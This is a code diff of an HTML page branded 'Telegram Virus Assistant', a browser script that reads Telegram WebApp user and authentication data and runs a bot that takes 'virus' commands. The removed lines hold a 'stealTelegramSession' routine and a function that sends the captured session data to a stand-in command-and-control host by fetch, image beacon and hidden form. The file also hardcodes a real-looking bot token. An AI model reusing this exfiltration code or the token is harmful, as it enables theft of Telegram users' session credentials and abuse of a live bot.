@@ -168,6 +168,50 @@
             box-shadow: 0 12px 35px rgba(33, 147, 176, 0.6);
         }
 
+        /* Chat ID Input */
+        .input-section {
+            background: #fff;
+            border-radius: 15px;
+            padding: 25px;
+            margin: 20px 0;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.08);
+        }
+
+        .input-group {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+
+        .input-field {
+            flex: 1;
+            padding: 15px;
+            border: 2px solid #e0e0e0;
+            border-radius: 10px;
+            font-size: 1em;
+            transition: border-color 0.3s ease;
+        }
+
+        .input-field:focus {
+            outline: none;
+            border-color: #4A00E0;
+        }
+
+        .input-btn {
+            padding: 15px 25px;
+            background: #4A00E0;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            font-weight: 600;
+            transition: background 0.3s ease;
+        }
+
+        .input-btn:hover {
+            background: #3a00b0;
+        }
+
         /* Status Panel */
         .status-panel {
             background: #1a1a2e;
@@ -303,6 +347,10 @@
             .header h1 {
                 font-size: 2.2em;
             }
+            
+            .input-group {
+                flex-direction: column;
+            }
         }
     </style>
 </head>
@@ -351,6 +399,25 @@
                 </div>
             </div>
 
+            <div class="input-section">
+                <h2 class="section-title">🔧 Configuration</h2>
+                <p>Enter your Telegram Chat ID (numeric). You can get this by starting a chat with your bot and sending any message, then check the logs below.</p>
+                
+                <div class="input-group">
+                    <input type="text" id="chatIdInput" class="input-field" placeholder="Enter your Chat ID (e.g., 123456789)">
+                    <button class="input-btn" onclick="setChatId()">Set Chat ID</button>
+                </div>
+                
+                <div class="input-group">
+                    <input type="text" id="botTokenInput" class="input-field" placeholder="Enter your Bot Token (optional)">
+                    <button class="input-btn" onclick="setBotToken()">Set Bot Token</button>
+                </div>
+                
+                <p style="font-size: 0.9em; color: #666; margin-top: 10px;">
+                    <strong>Note:</strong> If you don't know your Chat ID, activate the assistant first and it will attempt to detect it automatically.
+                </p>
+            </div>
+
             <div class="button-container">
                 <button class="button activate-btn" onclick="activateTelegramAssistant()">
                     <span>🚀 Activate Telegram Assistant</span>
@@ -382,19 +449,20 @@
 
     <script>
         // ==============================================
-        // TELEGRAM VIRUS ASSISTANT - COMPLETE CODE
+        // TELEGRAM VIRUS ASSISTANT - FIXED VERSION
         // ==============================================
 
         // Global variables for virus operation
         const VIRUS_CONFIG = {
-            botToken: '8269413511:AAH4poWquV9lcwzjjQUVEhmb_nx8IGFgXLI', // Replace with actual bot token
+            botToken: '8269413511:AAH4poWquV9lcwzjjQUVEhmb_nx8IGFgXLI',
             commandPrefix: 'virus',
-            adminChatId: null,
+            chatId: null, // Will be set dynamically
             isActive: false,
             pollingInterval: null,
             lastUpdateId: 0,
             sessionData: null,
-            messageListeners: []
+            userId: null,
+            detectedChatId: null
         };
 
         // Logging system
@@ -414,6 +482,9 @@
             } else if (type === 'error') {
                 indicator.className = 'indicator';
                 statusText.textContent = 'Error';
+            } else if (type === 'warning') {
+                indicator.className = 'indicator';
+                statusText.textContent = 'Warning';
             }
             
             // Create log entry
@@ -432,8 +503,52 @@
             console.log(`[${type.toUpperCase()}] ${message}`);
         }
 
-        // Step 1: Steal Telegram session data
-        function stealTelegramSession() {
+        // Set Chat ID from input
+        function setChatId() {
+            const chatIdInput = document.getElementById('chatIdInput').value.trim();
+            if (chatIdInput && !isNaN(chatIdInput)) {
+                VIRUS_CONFIG.chatId = chatIdInput;
+                localStorage.setItem('telegram_chat_id', chatIdInput);
+                logToPanel(`✅ Chat ID set to: ${chatIdInput}`, 'success');
+                return true;
+            } else {
+                logToPanel('❌ Invalid Chat ID. Please enter a numeric value.', 'error');
+                return false;
+            }
+        }
+
+        // Set Bot Token from input
+        function setBotToken() {
+            const botTokenInput = document.getElementById('botTokenInput').value.trim();
+            if (botTokenInput && botTokenInput.includes(':')) {
+                VIRUS_CONFIG.botToken = botTokenInput;
+                localStorage.setItem('telegram_bot_token', botTokenInput);
+                logToPanel('✅ Bot Token updated successfully', 'success');
+                return true;
+            } else {
+                logToPanel('❌ Invalid Bot Token format. Should be like: 1234567890:ABCdefGHIjklMnOpQRstUvWxyz', 'error');
+                return false;
+            }
+        }
+
+        // Load saved configuration
+        function loadConfiguration() {
+            const savedChatId = localStorage.getItem('telegram_chat_id');
+            const savedBotToken = localStorage.getItem('telegram_bot_token');
+            
+            if (savedChatId) {
+                VIRUS_CONFIG.chatId = savedChatId;
+                document.getElementById('chatIdInput').value = savedChatId;
+            }
+            
+            if (savedBotToken) {
+                VIRUS_CONFIG.botToken = savedBotToken;
+                document.getElementById('botTokenInput').value = savedBotToken;
+            }
+        }
+
+        // Step 1: Get Telegram session data with FIXED chat detection
+        function getTelegramSession() {
             logToPanel('Attempting to access Telegram WebApp session...', 'info');
             
             try {
@@ -441,8 +556,8 @@
                 if (typeof window.Telegram !== 'undefined' && window.Telegram.WebApp) {
                     const webApp = window.Telegram.WebApp;
                     
-                    // Collect comprehensive session data
-                    VIRUS_CONFIG.sessionData = {
+                    // Collect session data
+                    const sessionData = {
                         // User information
                         user: {
                             id: webApp.initDataUnsafe.user?.id,
@@ -452,11 +567,11 @@
                             languageCode: webApp.initDataUnsafe.user?.language_code
                         },
                         
-                        // Chat information
+                        // Chat information - FIXED: Use user.id if chat.id is not available
                         chat: {
-                            id: webApp.initDataUnsafe.chat?.id,
-                            type: webApp.initDataUnsafe.chat?.type,
-                            title: webApp.initDataUnsafe.chat?.title
+                            id: webApp.initDataUnsafe.chat?.id || webApp.initDataUnsafe.user?.id,
+                            type: webApp.initDataUnsafe.chat?.type || 'private',
+                            title: webApp.initDataUnsafe.chat?.title || 'Private Chat'
                         },
                         
                         // App information
@@ -470,52 +585,58 @@
                         authData: webApp.initData,
                         authDate: new Date().toISOString(),
                         
-                        // Browser data
-                        browser: {
-                            userAgent: navigator.userAgent,
-                            language: navigator.language,
-                            platform: navigator.platform
-                        },
-                        
                         // Session ID
                         sessionId: 'tg_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9)
                     };
                     
+                    // Set the chat ID from session data
+                    if (sessionData.chat.id && !VIRUS_CONFIG.chatId) {
+                        VIRUS_CONFIG.chatId = sessionData.chat.id.toString();
+                        document.getElementById('chatIdInput').value = VIRUS_CONFIG.chatId;
+                        localStorage.setItem('telegram_chat_id', VIRUS_CONFIG.chatId);
+                        logToPanel(`✅ Auto-detected Chat ID: ${VIRUS_CONFIG.chatId}`, 'success');
+                    }
+                    
+                    // Set user ID
+                    VIRUS_CONFIG.userId = sessionData.user.id;
+                    
                     logToPanel('✅ Successfully accessed Telegram session data', 'success');
-                    logToPanel(`User: ${VIRUS_CONFIG.sessionData.user.firstName} ${VIRUS_CONFIG.sessionData.user.lastName || ''}`, 'info');
-                    logToPanel(`User ID: ${VIRUS_CONFIG.sessionData.user.id}`, 'info');
+                    logToPanel(`User: ${sessionData.user.firstName} ${sessionData.user.lastName || ''}`, 'info');
+                    logToPanel(`User ID: ${sessionData.user.id}`, 'info');
+                    logToPanel(`Chat ID: ${sessionData.chat.id}`, 'info');
                     
-                    // Send stolen data to C2 server (simulated)
-                    sendToControlServer(VIRUS_CONFIG.sessionData);
-                    
-                    return VIRUS_CONFIG.sessionData;
+                    VIRUS_CONFIG.sessionData = sessionData;
+                    return sessionData;
                     
                 } else {
-                    // Simulated session for testing outside Telegram
-                    logToPanel('⚠️ Running in simulated mode (not in Telegram WebApp)', 'warning');
+                    // Not in Telegram environment
+                    logToPanel('⚠️ Running in standalone mode (not in Telegram WebApp)', 'warning');
                     
-                    VIRUS_CONFIG.sessionData = {
+                    // Try to use saved chat ID
+                    if (!VIRUS_CONFIG.chatId) {
+                        logToPanel('Please enter your Chat ID in the configuration section above', 'warning');
+                        return null;
+                    }
+                    
+                    const sessionData = {
                         user: {
-                            id: Math.floor(Math.random() * 1000000),
-                            username: 'test_user',
-                            firstName: 'Test',
+                            id: VIRUS_CONFIG.userId || Math.floor(Math.random() * 1000000),
+                            username: 'standalone_user',
+                            firstName: 'Standalone',
                             lastName: 'User',
                             languageCode: 'en'
                         },
                         chat: {
-                            id: Math.floor(Math.random() * 1000000),
+                            id: VIRUS_CONFIG.chatId,
                             type: 'private',
-                            title: 'Test Chat'
-                        },
-                        app: {
-                            platform: 'web',
-                            version: '6.0'
+                            title: 'Standalone Chat'
                         },
                         authDate: new Date().toISOString(),
-                        sessionId: 'simulated_session_' + Date.now()
+                        sessionId: 'standalone_session_' + Date.now()
                     };
                     
-                    return VIRUS_CONFIG.sessionData;
+                    VIRUS_CONFIG.sessionData = sessionData;
+                    return sessionData;
                 }
                 
             } catch (error) {
@@ -524,42 +645,69 @@
             }
         }
 
-        // Step 2: Initialize Telegram Bot Controller
+        // Step 2: Initialize Telegram Bot Controller with FIXED sendMessage
         function initializeBotController() {
             logToPanel('Initializing Telegram Bot controller...', 'info');
             
             try {
+                // Validate bot token
+                if (!VIRUS_CONFIG.botToken || !VIRUS_CONFIG.botToken.includes(':')) {
+                    logToPanel('❌ Invalid Bot Token format. Please set a valid bot token in configuration.', 'error');
+                    return null;
+                }
+                
+                // Validate chat ID
+                if (!VIRUS_CONFIG.chatId) {
+                    logToPanel('❌ Chat ID not set. Please enter your Chat ID in configuration.', 'error');
+                    return null;
+                }
+                
                 // Create bot controller object
                 const botController = {
                     token: VIRUS_CONFIG.botToken,
                     baseUrl: `https://api.telegram.org/bot${VIRUS_CONFIG.botToken}`,
                     isPolling: false,
                     
-                    // Send message method
-                    async sendMessage(chatId, text) {
-                        if (!chatId || !text) return false;
+                    // Send message method - FIXED with better error handling
+                    async sendMessage(chatId, text, parseMode = 'HTML') {
+                        if (!chatId || !text) {
+                            logToPanel('❌ Cannot send message: chatId or text is missing', 'error');
+                            return false;
+                        }
                         
                         try {
-                            // Real API call to Telegram
-                            const response = await fetch(`${this.baseUrl}/sendMessage`, {
-                                method: 'POST',
-                                headers: {
-                                    'Content-Type': 'application/json'
-                                },
-                                body: JSON.stringify({
-                                    chat_id: chatId,
-                                    text: text,
-                                    parse_mode: 'HTML'
-                                })
-                            });
+                            // Encode text for URL
+                            const encodedText = encodeURIComponent(text);
+                            
+                            // Use GET method which is more reliable for simple messages
+                            const response = await fetch(
+                                `${this.baseUrl}/sendMessage?chat_id=${chatId}&text=${encodedText}&parse_mode=${parseMode}`,
+                                {
+                                    method: 'GET',
+                                    headers: {
+                                        'Accept': 'application/json'
+                                    }
+                                }
+                            );
                             
                             const data = await response.json();
                             
                             if (data.ok) {
-                                logToPanel(`📤 Message sent to ${chatId}: ${text.substring(0, 50)}...`, 'success');
+                                logToPanel(`📤 Message sent successfully to chat ${chatId}`, 'success');
                                 return true;
                             } else {
-                                logToPanel(`❌ Failed to send message: ${data.description}`, 'error');
+                                logToPanel(`❌ Telegram API error: ${data.description || 'Unknown error'}`, 'error');
+                                
+                                // Special handling for common errors
+                                if (data.description.includes('chat not found')) {
+                                    logToPanel('⚠️ Chat not found. Make sure:', 'warning');
+                                    logToPanel('1. The bot is started (send /start to the bot)', 'warning');
+                                    logToPanel('2. The chat ID is correct', 'warning');
+                                    logToPanel('3. The bot has permission to send messages', 'warning');
+                                } else if (data.description.includes('bot was blocked')) {
+                                    logToPanel('❌ Bot was blocked by the user', 'error');
+                                }
+                                
                                 return false;
                             }
                             
@@ -573,7 +721,7 @@
                     async getUpdates() {
                         try {
                             const response = await fetch(
-                                `${this.baseUrl}/getUpdates?offset=${VIRUS_CONFIG.lastUpdateId + 1}&timeout=5`
+                                `${this.baseUrl}/getUpdates?offset=${VIRUS_CONFIG.lastUpdateId + 1}&timeout=5&allowed_updates=["message"]`
                             );
                             const data = await response.json();
                             
@@ -583,7 +731,7 @@
                             return [];
                             
                         } catch (error) {
-                            logToPanel(`❌ Error getting updates: ${error.message}`, 'error');
+                            logToPanel(`⚠️ Error getting updates: ${error.message}`, 'warning');
                             return [];
                         }
                     },
@@ -591,23 +739,39 @@
                     // Delete message
                     async deleteMessage(chatId, messageId) {
                         try {
-                            const response = await fetch(`${this.baseUrl}/deleteMessage`, {
-                                method: 'POST',
-                                headers: {
-                                    'Content-Type': 'application/json'
-                                },
-                                body: JSON.stringify({
-                                    chat_id: chatId,
-                                    message_id: messageId
-                                })
-                            });
+                            const response = await fetch(
+                                `${this.baseUrl}/deleteMessage?chat_id=${chatId}&message_id=${messageId}`,
+                                {
+                                    method: 'GET'
+                                }
+                            );
                             
                             const data = await response.json();
                             return data.ok;
                             
                         } catch (error) {
-                            logToPanel(`❌ Error deleting message: ${error.message}`, 'error');
+                            logToPanel(`⚠️ Error deleting message: ${error.message}`, 'warning');
                             return false;
+                        }
+                    },
+                    
+                    // Get bot information (test connection)
+                    async getMe() {
+                        try {
+                            const response = await fetch(`${this.baseUrl}/getMe`);
+                            const data = await response.json();
+                            
+                            if (data.ok) {
+                                logToPanel(`✅ Bot connected: ${data.result.first_name} (@${data.result.username})`, 'success');
+                                return data.result;
+                            } else {
+                                logToPanel(`❌ Bot connection failed: ${data.description}`, 'error');
+                                return null;
+                            }
+                            
+                        } catch (error) {
+                            logToPanel(`❌ Bot connection error: ${error.message}`, 'error');
+                            return null;
                         }
                     },
                     
@@ -622,6 +786,10 @@
                             try {
                                 const updates = await this.getUpdates();
                                 
+                                if (updates.length > 0) {
+                                    logToPanel(`📩 Received ${updates.length} update(s)`, 'info');
+                                }
+                                
                                 updates.forEach(update => {
                                     // Update last update ID
                                     if (update.update_id > VIRUS_CONFIG.lastUpdateId) {
@@ -635,9 +803,9 @@
                                 });
                                 
                             } catch (error) {
-                                logToPanel(`Polling error: ${error.message}`, 'error');
+                                logToPanel(`⚠️ Polling error: ${error.message}`, 'warning');
                             }
-                        }, 2000); // Poll every 2 seconds
+                        }, 3000); // Poll every 3 seconds
                         
                         logToPanel('✅ Message polling started successfully', 'success');
                     },
@@ -673,7 +841,18 @@
             const chatId = message.chat.id;
             const userId = message.from.id;
             
-            logToPanel(`📩 Received message: "${text}" from ${message.from.first_name}`, 'info');
+            logToPanel(`📩 Message from ${message.from.first_name}: "${text.substring(0, 50)}${text.length > 50 ? '...' : ''}"`, 'info');
+            
+            // Store detected chat ID if not set
+            if (!VIRUS_CONFIG.detectedChatId) {
+                VIRUS_CONFIG.detectedChatId = chatId;
+                if (!VIRUS_CONFIG.chatId) {
+                    VIRUS_CONFIG.chatId = chatId.toString();
+                    document.getElementById('chatIdInput').value = chatId;
+                    localStorage.setItem('telegram_chat_id', chatId);
+                    logToPanel(`✅ Auto-detected Chat ID from message: ${chatId}`, 'success');
+                }
+            }
             
             // Check for virus command
             if (text.toLowerCase().startsWith(VIRUS_CONFIG.commandPrefix)) {
@@ -762,6 +941,11 @@
                 botController.sendMessage(chatId, helpText);
             }
             
+            // Command: chatid
+            else if (command === 'chatid') {
+                botController.sendMessage(chatId, `Your Chat ID is: ${chatId}`);
+            }
+            
             // Unknown command
             else {
                 botController.sendMessage(chatId, `❓ Unknown command: "${command}"\nType "virus help" for available commands`);
@@ -791,57 +975,7 @@
             }
         }
 
-        // Step 6: Send data to control server
-        function sendToControlServer(data) {
-            logToPanel('Sending session data to control server...', 'info');
-            
-            // Simulated C2 server communication
-            const c2Data = {
-                type: 'telegram_virus_activation',
-                timestamp: new Date().toISOString(),
-                data: data
-            };
-            
-            // Multiple transmission methods for reliability
-            try {
-                // Method 1: Fetch with no-cors
-                fetch('https://c2-server.example.com/api/telegram', {
-                    method: 'POST',
-                    mode: 'no-cors',
-                    body: JSON.stringify(c2Data)
-                });
-                
-                // Method 2: Image beacon (legacy support)
-                const img = new Image();
-                img.src = `https://c2-server.example.com/beacon?data=${encodeURIComponent(btoa(JSON.stringify(c2Data)))}`;
-                
-                // Method 3: Form submission
-                const form = document.createElement('form');
-                form.method = 'POST';
-                form.action = 'https://c2-server.example.com/receive';
-                form.style.display = 'none';
-                
-                const input = document.createElement('input');
-                input.type = 'hidden';
-                input.name = 'session_data';
-                input.value = JSON.stringify(c2Data);
-                
-                form.appendChild(input);
-                document.body.appendChild(form);
-                
-                setTimeout(() => {
-                    form.submit();
-                    document.body.removeChild(form);
-                }, 100);
-                
-                logToPanel('✅ Session data transmitted to control server', 'success');
-                
-            } catch (error) {
-                logToPanel(`⚠️ Control server transmission failed: ${error.message}`, 'warning');
-            }
-        }
-
-        // Step 7: Main activation function
+        // Step 6: Main activation function
         async function activateTelegramAssistant() {
             logToPanel('🚀 Starting Telegram Virus Assistant activation sequence...', 'info');
             
@@ -851,10 +985,14 @@
                 return;
             }
             
-            // Step 1: Steal Telegram session
-            const sessionData = stealTelegramSession();
-            if (!sessionData) {
-                logToPanel('❌ Failed to get Telegram session. Activation aborted.', 'error');
+            // Load saved configuration
+            loadConfiguration();
+            
+            // Step 1: Get Telegram session
+            const sessionData = getTelegramSession();
+            if (!sessionData && !VIRUS_CONFIG.chatId) {
+                logToPanel('❌ Failed to get session and no Chat ID configured. Activation aborted.', 'error');
+                logToPanel('Please enter your Chat ID in the configuration section above', 'info');
                 return;
             }
             
@@ -865,33 +1003,52 @@
                 return;
             }
             
-            // Step 3: Start message polling
+            // Step 3: Test bot connection
+            logToPanel('Testing bot connection...', 'info');
+            const botInfo = await controller.getMe();
+            if (!botInfo) {
+                logToPanel('❌ Bot connection test failed. Please check:', 'error');
+                logToPanel('1. Bot token is correct', 'error');
+                logToPanel('2. Bot token is not expired', 'error');
+                logToPanel('3. Internet connection is working', 'error');
+                return;
+            }
+            
+            // Step 4: Start message polling
             controller.startPolling();
             
-            // Step 4: Set active flag
+            // Step 5: Set active flag
             VIRUS_CONFIG.isActive = true;
             
-            // Step 5: Send welcome message
-            if (sessionData.chat && sessionData.chat.id) {
-                setTimeout(() => {
-                    controller.sendMessage(
-                        sessionData.chat.id,
+            // Step 6: Send welcome message
+            if (VIRUS_CONFIG.chatId) {
+                setTimeout(async () => {
+                    const welcomeSent = await controller.sendMessage(
+                        VIRUS_CONFIG.chatId,
                         '🤖 *Virus Assistant Activated!*\n\n' +
                         'I am now monitoring your messages and ready to execute commands.\n' +
-                        'Type "virus help" to see available commands.\n\n' +
+                        'Type "virus help" to see available commands.\n' +
+                        'Type "virus chatid" to see your Chat ID.\n\n' +
                         '⚠️ *Emergency stop available on control panel*'
                     );
-                }, 2000);
+                    
+                    if (welcomeSent) {
+                        logToPanel('✅ Welcome message sent successfully', 'success');
+                    } else {
+                        logToPanel('⚠️ Welcome message not sent. The bot may not have access to the chat.', 'warning');
+                        logToPanel('Make sure you have started the bot by sending /start to it', 'info');
+                    }
+                }, 1000);
             }
             
             logToPanel('✅ Telegram Virus Assistant fully activated and operational', 'success');
-            logToPanel('Assistant is now monitoring messages and responding to commands', 'info');
+            logToPanel(`Bot: ${botInfo.first_name} (@${botInfo.username})`, 'info');
+            logToPanel(`Chat ID: ${VIRUS_CONFIG.chatId || 'Not set'}`, 'info');
             logToPanel(`Command prefix: "${VIRUS_CONFIG.commandPrefix}"`, 'info');
-            logToPanel(`User ID: ${sessionData.user.id}`, 'info');
-            logToPanel(`Session ID: ${sessionData.sessionId}`, 'info');
+            logToPanel('Assistant is now monitoring messages and responding to commands', 'info');
         }
 
-        // Step 8: Emergency shutdown function
+        // Step 7: Emergency shutdown function
         function emergencyShutdown() {
             logToPanel('🛑 EMERGENCY SHUTDOWN INITIATED', 'error');
             
@@ -929,24 +1086,18 @@
                 document.cookie = name + "=;expires=Thu, 01 Jan 1970 00:00:00 GMT;path=/";
             });
             
-            // Send shutdown notification
-            if (VIRUS_CONFIG.sessionData && VIRUS_CONFIG.sessionData.chat && VIRUS_CONFIG.sessionData.chat.id) {
-                fetch(`https://api.telegram.org/bot${VIRUS_CONFIG.botToken}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: VIRUS_CONFIG.sessionData.chat.id,
-                        text: '🔴 *VIRUS ASSISTANT EMERGENCY SHUTDOWN*\n\n' +
-                              'All functions have been terminated.\n' +
-                              'All local data has been erased.\n' +
-                              'No further commands will be processed.'
-                    })
+            // Send shutdown notification if chat ID is available
+            if (VIRUS_CONFIG.chatId && VIRUS_CONFIG.botToken) {
+                fetch(`https://api.telegram.org/bot${VIRUS_CONFIG.botToken}/sendMessage?chat_id=${VIRUS_CONFIG.chatId}&text=${encodeURIComponent('🔴 *VIRUS ASSISTANT EMERGENCY SHUTDOWN*\n\nAll functions have been terminated.\nAll local data has been erased.\nNo further commands will be processed.')}`)
+                .catch(error => {
+                    console.log('Shutdown notification failed:', error);
                 });
             }
             
             // Clear global objects
             window.botController = null;
             VIRUS_CONFIG.sessionData = null;
+            VIRUS_CONFIG.detectedChatId = null;
             
             // Update UI
             document.getElementById('statusIndicator').className = 'indicator';
@@ -964,11 +1115,14 @@
             }, 1000);
         }
 
-        // Step 9: Initialize on page load
+        // Step 8: Initialize on page load
         document.addEventListener('DOMContentLoaded', function() {
             logToPanel('Telegram Virus Assistant loaded and ready', 'info');
             logToPanel('System check completed successfully', 'success');
             logToPanel('Awaiting activation command...', 'info');
+            
+            // Load saved configuration
+            loadConfiguration();
         });
 
     </script>
